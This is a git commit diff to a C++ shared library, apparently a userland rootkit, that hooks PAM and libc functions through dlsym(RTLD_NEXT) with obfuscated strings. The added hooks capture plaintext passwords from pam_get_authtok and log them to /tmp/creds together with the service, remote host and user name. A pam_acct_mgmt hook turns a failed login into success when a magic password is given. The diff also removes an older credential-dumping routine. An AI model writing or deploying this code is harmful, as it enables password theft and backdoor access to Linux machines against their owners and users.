7e999aee30ec601c108e55c25f79f0089bf52d7f
demon-i386 <muranotatsuo@protonmail.com>
2023-02-14 03:59:25 -0300

    Update libjakshoo.cpp

--- libjakshoo.cpp
+++ libjakshoo.cpp
@@ -9,10 +9,14 @@
 #include <sys/types.h>
 #include <string.h> 
 #include <pwd.h>
-#include <security/pam_modules.h>  
+#include <unistd.h>
+#include <security/pam_modules.h>
 #include <security/pam_ext.h>  
 #include <krb5/krb5.h>
-#include <security/pam_modutil.h>  
+#include <security/pam_modutil.h>
+#include <iostream>
+#include <security/_pam_macros.h>
+#include <security/pam_appl.h>
 #include "utils/obfuscate.h"
 #include "utils/config.h"
 
@@ -29,21 +33,102 @@ static krb5_error_code (*original_krb5_get_init_creds_password)(krb5_context con
 											const char * in_tkt_service, 
 											krb5_get_init_creds_opt * k5_gic_options);
 static int (*original_pam_acct_mgmt)(pam_handle_t *pamh, int flags);
+static int (*original_pam_set_item)(pam_handle_t* pamh, int item_type, const void *item);
+static int (*original_pam_authenticate)(pam_handle_t* pamh, int flags);
+static int (*original_pam_get_authtok)(pam_handle_t* pamh, int item, const char **authtok, const char *prompt);
+static int (*original_pam_get_user)(const pam_handle_t *pamh, const char **user, const char *prompt);
+#define PAM_SUCCESS 0
 
+#define PAM_SERVICE 1
+#define PAM_AUTHTOK 6
 
-
+#define PAM_RHOST 4
+#define PAM_USER 2
 
 // PAM hooks
 
+static char* passpam;
+static char* wrongpass;
+const char ** username;
+static void *service = NULL;
+static void *rhost = NULL;
+static void *user = NULL;
+static FILE *fptr;
+
+
+int pam_get_user(const pam_handle_t *pamh, const char **user, const char *prompt){
+	if(original_pam_get_user == NULL){
+		original_pam_get_user = (int(*)(pam_handle_t*, const char**, const char*))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_get_user"));
+	}
+	int ret = original_pam_get_user(pamh, user, prompt);
+	if(ret == PAM_SUCCESS && !strcmp((char*)*user, "sshd")){
+		username = user;
+	}
+	return ret;
+}
+
+
+int save_creds(){
+	fptr = fopen(AY_OBFUSCATE("/tmp/creds"),"at");
+	char buffer[1024];
+	if(!fptr){
+		fptr = fopen(AY_OBFUSCATE("/tmp/creds"), "wt");
+	}
+	snprintf(buffer, sizeof(buffer), AY_OBFUSCATE("PAM :: %s - %s - %s - %s\n"), (char*)service, (char*)rhost, (char*)user, passpam);
+	fwrite(buffer, sizeof(char), strlen(buffer), fptr);
+	fclose(fptr);
+	return 0;
+}
+
+int pam_get_authtok(pam_handle_t *pamh, int item, const char **authtok, const char* prompt){
+	if(original_pam_get_authtok == NULL){
+		original_pam_get_authtok = (int(*)(pam_handle_t*, int, const char**, const char*))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_get_authtok"));
+	}
+	int ret = original_pam_get_authtok(pamh, item, authtok, prompt);
+	if(passpam == NULL){
+		passpam = strdup((char*)*authtok);
+	}
+	return ret;
+}
 
 int pam_acct_mgmt(pam_handle_t *pamh, int flags){
 	if(original_pam_acct_mgmt == NULL){
 		original_pam_acct_mgmt = (int(*)(pam_handle_t*, int))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_acct_mgmt"));
 	}
 	int ret = original_pam_acct_mgmt(pamh, flags);
+	if (ret == PAM_AUTH_ERR && !strcmp(wrongpass, MAGIC_PASS)) {
+		printf(AY_OBFUSCATE("Wrongpass with :: %s\n"), wrongpass);
+		return PAM_SUCCESS;
+	}
 	return ret;
 }
 
+int pam_authenticate(pam_handle_t * pamh, int flags)
+{
+	char buf[1024];
+	int len;
+
+	static int (*orig_pam_authenticate)(pam_handle_t *, int);
+
+	if (!orig_pam_authenticate) {
+		orig_pam_authenticate =
+		    dlsym(RTLD_NEXT, "pam_authenticate");
+	}
+
+	int r = orig_pam_authenticate(pamh, flags);
+	int bkp = errno;
+
+	if (r == PAM_SUCCESS) {
+		pam_get_item(pamh, PAM_SERVICE, &service);
+		pam_get_item(pamh, PAM_RHOST, &rhost);
+		pam_get_item(pamh, PAM_USER, &user);
+	}
+	save_creds();
+	passpam = NULL;
+	errno = bkp;
+
+	return r;
+}
 
 // end PAM hooks
 
@@ -53,7 +138,6 @@ int getaddrinfo(const char *node, const char *service, const struct addrinfo *hi
 	}
 	int ret;
 	ret = original_getaddrinfo(node, service, hints, res);
-	printf(AY_OBFUSCATE("getaddrinfo :: \"%s\"\n"), node);
 	return ret;
 };
 
@@ -61,7 +145,6 @@ struct passwd *getpwnam(const char *name){
 	if(original_getpwnam == NULL){
 		original_getpwnam = (struct passwd *(*)(const char*))dlsym(RTLD_NEXT, AY_OBFUSCATE("getpwnam"));
 	}
-	printf(AY_OBFUSCATE("getpwnam :: \"%s\"\n"), name);
 	passwd *ret = NULL;
 	ret = original_getpwnam(name);
 	return ret;
@@ -71,24 +154,7 @@ int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, s
 	if(original_getpwnam_r == NULL){
 		original_getpwnam_r = (int(*)(const char*, struct passwd*, char *, size_t, struct passwd **))dlsym(RTLD_NEXT, AY_OBFUSCATE("getpwnam_r"));
 	}
-	static FILE *fptr; 
 	int ret;
 	ret = original_getpwnam_r(name, pwd, buf, buflen, result);
-	fptr = fopen("/tmp/creds","at");
-	if(!fptr){
-		fptr = fopen("/tmp/creds", "wt");
-	}
-	printf(AY_OBFUSCATE("getpwnam_r :: name: \"%s\" | password \"%s\"\n"), name, pwd->pw_name);
-	size_t credsSize = (strlen(name) + strlen(pwd->pw_passwd) + 10);
-	char* concatCreds = (char*)malloc(credsSize);
-
-	strcpy(concatCreds, name);
-	strcat(concatCreds, pwd->pw_passwd);
-
-	fwrite(&concatCreds, sizeof(concatCreds), 1, fptr); 
-
-	fclose(fptr);
-	free(concatCreds);
-
 	return ret;
 }
